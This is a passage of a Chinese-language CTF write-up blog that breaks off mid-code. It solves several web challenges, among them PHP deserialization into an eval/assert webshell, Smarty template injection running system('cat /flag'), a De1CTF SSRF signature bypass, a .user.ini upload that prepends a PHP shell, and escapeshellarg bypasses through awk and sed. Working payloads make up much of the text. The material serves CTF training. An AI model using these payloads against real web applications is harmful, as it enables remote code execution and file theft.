class="line">就是function()</span><br><span class="line">step2:</span><br><span class="line">构造payload=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A17%3A%22eval%28%24_POST%5Bcmd%5D%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br><span class="line">&lt;?</span><br><span class="line">class HelloPhp</span><br><span class="line">&#123;</span><br><span class="line">    public $a = &#x27;eval($_POST[cmd])&#x27;;</span><br><span class="line">  public $b = &quot;assert&quot;;</span><br><span class="line">  public function __destruct()</span><br><span class="line">  &#123;</span><br><span class="line">      $a = $this-&gt;a;</span><br><span class="line">      $b = $this-&gt;b;</span><br><span class="line">      echo $b($a);</span><br><span class="line">  &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    echo $c =urlencode(serialize(new HelloPhp));</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br><span class="line">?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A17%3A%22eval%28%24_POST%5Bcmd%5D%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br><span class="line">执行cmd=phpinfo();搜索flag就拿到了</span><br></pre></td></tr></table></figure>

<h2 id="ssti-smarty"><a href="#ssti-smarty" class="headerlink" title="ssti(smarty)"></a>ssti(smarty)</h2><h3 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h3><h4 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">smarty</span><br><span class="line">有IP相关，获取到了IP，通过控制XFF进行命令执行，基本可以确定是smarty模板注入</span><br><span class="line">smarty的版本号:	&#123;$smarty.version&#125;		</span><br><span class="line">php标签：</span><br><span class="line">&#123;php&#125;phpinfo()&#123;/php&#125;</span><br><span class="line"> Smarty已经废弃&#123;php&#125;标签，在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。  </span><br><span class="line">&#123;literal&#125; 标签：</span><br><span class="line">&#123;literal&#125;</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;</span><br><span class="line">&#123;/literal&#125;</span><br><span class="line"> &#123;if&#125;标签 :</span><br><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if readfile(‘文件路劲’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if show_source(‘文件路径’)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if passthru(‘操作命令’)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-23"><a href="#解题过程：-23" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">step1：</span><br><span class="line">提示ip,看到了smarty,在xff尝试&#123;&#123;7*7&#125;&#125;在current ip那里有回显49</span><br><span class="line">step2:</span><br><span class="line">&#123;if phpinfo()&#125;(/if)有回显</span><br><span class="line">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;ls /&#x27;)&#125;&#123;/if&#125;</span><br><span class="line">&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<h2 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><h4 id="考点：-11"><a href="#考点：-11" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">代码审计</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-24"><a href="#解题过程：-24" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, jsonify</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib.request</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secret_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = hashlib.md5(ip.encode()).hexdigest()</span><br><span class="line">        if not os.path.exists(self.sandbox):</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def exec_task(self):</span><br><span class="line">        result = &#123;&#x27;code&#x27;: 500&#125;</span><br><span class="line">        if self.check_sign():</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                result_file = os.path.join(self.sandbox, &quot;result.txt&quot;)</span><br><span class="line">                with open(result_file, &#x27;w&#x27;) as tmpfile:</span><br><span class="line">                    resp = self.scan(self.param)</span><br><span class="line">                    if resp == &quot;Connection Timeout&quot;:</span><br><span class="line">                        result[&#x27;data&#x27;] = resp</span><br><span class="line">                    else:</span><br><span class="line">                        tmpfile.write(resp)</span><br><span class="line">                result[&#x27;code&#x27;] = 200</span><br><span class="line">            elif &quot;read&quot; in self.action:</span><br><span class="line">                result_file = os.path.join(self.sandbox, &quot;result.txt&quot;)</span><br><span class="line">                with open(result_file, &#x27;r&#x27;) as f:</span><br><span class="line">                    result[&#x27;code&#x27;] = 200</span><br><span class="line">                    result[&#x27;data&#x27;] = f.read()</span><br><span class="line">            else:</span><br><span class="line">                result[&#x27;data&#x27;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&#x27;code&#x27;] = 500</span><br><span class="line">            result[&#x27;msg&#x27;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def check_sign(self):</span><br><span class="line">        expected_sign = get_sign(self.action, self.param)</span><br><span class="line">        return expected_sign == self.sign</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def generate_sign():</span><br><span class="line">    param = request.args.get(&quot;param&quot;, &quot;&quot;)</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return get_sign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = request.cookies.get(&quot;action&quot;)</span><br><span class="line">    param = request.args.get(&quot;param&quot;, &quot;&quot;)</span><br><span class="line">    sign = request.cookies.get(&quot;sign&quot;)</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if waf(param):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return jsonify(task.exec_task())</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    with open(&quot;code.txt&quot;, &quot;r&quot;) as file:</span><br><span class="line">        return file.read()</span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        response = urllib.request.urlopen(param).read()[:50]</span><br><span class="line">        return response.decode()</span><br><span class="line">    except Exception:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def get_sign(action, param):</span><br><span class="line">    return hashlib.md5(secret_key + param.encode() + action.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    if check.startswith((&quot;gopher&quot;, &quot;file&quot;)):</span><br><span class="line">        return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=80, debug=False)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">思路：</span><br><span class="line">/geneSign</span><br><span class="line">传param以及默认action=scan通过getSign生成签名</span><br><span class="line">/De1ta</span><br><span class="line">从cookie中获去action和sign和param传入task</span><br><span class="line">waf()过滤gopher和file</span><br><span class="line">getSign()返回hashlib.md5(secert_key + param + action).hexdigest(),action,param是可控的</span><br><span class="line">scan可以直接写文件名或者读取本地文件</span><br><span class="line">Exec()主要是action中如果有read和scan关键字及操作，action中有scan，利用scan()方法读取内容并放入result.txt，有read即读取result.txt</span><br><span class="line">看到hintflag在flag.txt里面</span><br><span class="line">所以要去用scan把flag.txt写入result.txt,在用read读取,</span><br><span class="line">先满足sign才可以读到flag.txt</span><br><span class="line">代码审计，看到有三个参数param，action,sign,</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-25"><a href="#解题过程：-25" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">step1:</span><br><span class="line">/geneSign?param=flag.txtread获取sign</span><br><span class="line">输入flag.txtread的原因是因为action是scan，而在getSign里几个字符是.号会连接起来，所以就变成了key.flag.txtreadscan(拼接)/因为secret_key + param.encode() + action.encode()/</span><br><span class="line">De1ta?param=flag.txt</span><br><span class="line">cookie: action=readscan;sign=e0cbd840a7cb064356554e8878fbc8d7</span><br></pre></td></tr></table></figure>

<h3 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h3><h4 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.file_get_contents(path,include_path,context,start,max_length)</span><br><span class="line">path 	必需。规定要读取的文件。</span><br><span class="line">include_path 	可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 &quot;1&quot;。</span><br><span class="line">context		可选。规定文件句柄的环境。</span><br><span class="line">context 	是一套可以修改流的行为的选项。若使用 null，则忽略。</span><br><span class="line">start 	可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</span><br><span class="line">max_length 	可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</span><br><span class="line">2.file_put_contents ( string filename, string data [, int flags [, resource context]] )</span><br><span class="line">filename 	文件名</span><br><span class="line">data 	文件数据</span><br><span class="line">3.php弱比较类型/http://t.csdnimg.cn/AaBCO/</span><br><span class="line">布尔值true和任意字符串都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的，例如:</span><br><span class="line">var_dump(true==&quot;hyuf&quot;)                   //true</span><br><span class="line">var_dump(True == 0);	                 //bool(false)</span><br><span class="line">var_dump(True == &#x27;False&#x27;);	             //bool(true)</span><br><span class="line">var_dump(True == 2);	                 //bool(true)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2021-05-31 13:40:37</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2021-05-31 16:36:27</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">class fileUtil&#123;</span><br><span class="line"></span><br><span class="line">    private $name;</span><br><span class="line">    private $content;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __construct($name,$content=&#x27;&#x27;)&#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;content = $content;</span><br><span class="line">        ini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function file_upload()&#123;</span><br><span class="line">        if($this-&gt;waf($this-&gt;name) &amp;&amp; $this-&gt;waf($this-&gt;content))&#123;</span><br><span class="line">            return file_put_contents($this-&gt;name, $this-&gt;content);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function waf($input)&#123;</span><br><span class="line">        return !preg_match(&#x27;/php/i&#x27;, $input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function file_download()&#123;</span><br><span class="line">        if(file_exists($this-&gt;name))&#123;</span><br><span class="line">            header(&#x27;Content-Type: application/octet-stream&#x27;);</span><br><span class="line">            header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27;.$this-&gt;name.&#x27;&quot;&#x27;);</span><br><span class="line">            header(&#x27;Content-Transfer-Encoding: binary&#x27;);</span><br><span class="line">            echo file_get_contents($this-&gt;name);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return False;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$action = $_GET[&#x27;a&#x27;]?$_GET[&#x27;a&#x27;]:highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($action===&#x27;upload&#x27;)&#123;</span><br><span class="line">    die(&#x27;Permission denied&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">switch ($action) &#123;</span><br><span class="line">    case &#x27;upload&#x27;:</span><br><span class="line">        $name = $_POST[&#x27;name&#x27;];</span><br><span class="line">        $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">        $ft = new fileUtil($name,$content);</span><br><span class="line">        if($ft-&gt;file_upload())&#123;</span><br><span class="line">            echo $name.&#x27; upload success!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;download&#x27;:</span><br><span class="line">        $name = $_POST[&#x27;name&#x27;];</span><br><span class="line">        $ft = new fileUtil($name,$content);</span><br><span class="line">        if($ft-&gt;file_download()===False)&#123;</span><br><span class="line">            echo $name.&#x27; download failed&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line">    default:</span><br><span class="line">        echo &#x27;baby come on&#x27;;</span><br><span class="line">        break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file_upload里面有file_put_contents($this-&gt;name, $this-&gt;content)//file_put_contents ( string filename, string data [, int flags [, resource context]] )将filename文件名，data文件数据，就是一个写文件的操作</span><br><span class="line">__construct构造函数，并明确所有文件操作都在/var/www/html路径</span><br><span class="line">file_download这是一个读文件的操作，有file_get_contents，在这里可以读文件;</span><br><span class="line">$action = $_GET[&#x27;a&#x27;]?$_GET[&#x27;a&#x27;]:highlight_file(__FILE__);三元运算，但是这里其实是默认那个a=true了</span><br><span class="line">&lt;?php</span><br><span class="line">var_dump(highlight_file(_file_));</span><br><span class="line">?&gt;可以试一下。回显就是bool(true)从这进去switch就是弱比较了，比较true和upload返回true直接进入&#x27;upload&#x27;了这样就绕过了</span><br><span class="line">if($action===&#x27;upload&#x27;)&#123;</span><br><span class="line">    die(&#x27;Permission denied&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">所以进入upload我们利用的是file_get_contents,我们可以写文件，所以就想到利用user.ini,让我们的代码包含在当前页面index.php也就是当前页面</span><br></pre></td></tr></table></figure>

<h4 id="解题过程-13"><a href="#解题过程-13" class="headerlink" title="解题过程"></a>解题过程</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">name=.user.ini&amp;content=auto_prepend_file=1.jpg;</span><br><span class="line">name=1.jpg&amp;content=&lt;?= system(&#x27;ls /&#x27;);?&gt;</span><br><span class="line">name=1.jpg&amp;content=&lt;?= system(&#x27;cat /flag_baby_here_you_are home&#x27;)?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="easyPHP"><a href="#easyPHP" class="headerlink" title="easyPHP"></a>easyPHP</h3><h4 id="知识点：-12"><a href="#知识点：-12" class="headerlink" title="知识点："></a>知识点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.sed命令</span><br><span class="line">2.awk命令</span><br><span class="line">awk options &#x27;pattern &#123;action&#125;&#x27; file</span><br><span class="line">options：是一些选项，用于控制 awk 的行为。</span><br><span class="line">pattern：是用于匹配输入数据的模式。如果省略，则 awk 将对所有行进行操作。</span><br><span class="line">&#123;action&#125;：是在匹配到模式的行上执行的动作。如果省略，则默认动作是打印整行。</span><br><span class="line">3.escapeshellcmd是对&amp;#;|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 `\xFF这些字符之前添加一个转义字符&#x27;\&#x27;。</span><br><span class="line"></span><br><span class="line">escapeshellarg的作用是 用空格替换了百分号、感叹号（延迟变量替换）和双引号，并在字符串两边加上双引号。此外，每条连续的反斜线(\)都会被一个额外的反斜线所转义。</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-26"><a href="#解题过程：-26" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2022-03-19 12:10:55</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2022-03-19 13:27:18</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">$param = $_POST[&#x27;param&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($cmd) &amp;&amp; isset($param))&#123;</span><br><span class="line">    $cmd=escapeshellcmd(substr($cmd,0,3)).&quot; &quot;.escapeshellarg($param).&quot; &quot;.__FILE__;</span><br><span class="line">    shell_exec($cmd)这个;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注意看到shell_exec($cmd)这个这里可控，由于escapeshellcmd(substr($cmd,0,3))只取cmd前三个字母，escapeshellarg($param)会对传进来的的东西进行特定的空格替换,在这里有两种方法利用sed或者awk/sed是替换原来代码一些东西，awk是把我们要的提取合在一个地方/</span><br><span class="line">法一：awk</span><br><span class="line">payload</span><br><span class="line">cmd=awk&amp;param=&#123;system(&quot;ls /&gt;a.txt&quot;)&#125;</span><br><span class="line">cmd=awk&amp;param=&#123;system(&quot;cat /f1agaaa&quot;)&#125;//用&#123;&#125;是因为awk的语法规范</span><br><span class="line">法二：sed</span><br><span class="line">cmd=sed&amp;param=/esca/d;s/shell_exec/system/g;w 1.php</span><br><span class="line">则访问1.php，代码变成：</span><br><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2022-03-19 12:10:55</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2022-03-19 13:27:18</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">$param = $_POST[&#x27;param&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($cmd) &amp;&amp; isset($param))&#123;</span><br><span class="line">    system($cmd);</span><br><span class="line">&#125;</span><br><span class="line">然后直接执行命令</span><br><span class="line">cmd=ls /&amp;param=a</span><br><span class="line">cmd=cat /f1agaaa&amp;param=a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="week6"><a href="#week6" class="headerlink" title="week6"></a>week6</h1><h2 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="给你shell"><a href="#给你shell" class="headerlink" title="给你shell"></a>给你shell</h3><h4 id="考点：-12"><a href="#考点：-12" class="headerlink" title="考点："></a>考点：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.fuzz</span><br><span class="line">2.爆破</span><br><span class="line">3.取反绕过</span><br></pre></td></tr></table></figure>

<h4 id="解题过程：-27"><a href="#解题过程：-27" class="headerlink" title="解题过程："></a>解题过程：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">step1:在源代码上看到/?view.source和flag在flag.txt里面</span><br><span class="line">访问/?view.source</span><br><span class="line"> &lt;?php</span><br><span class="line">//It&#x27;s no need to use scanner. Of course if you want, but u will find nothing.</span><br><span class="line">error_reporting(0);</span><br><span class="line">include 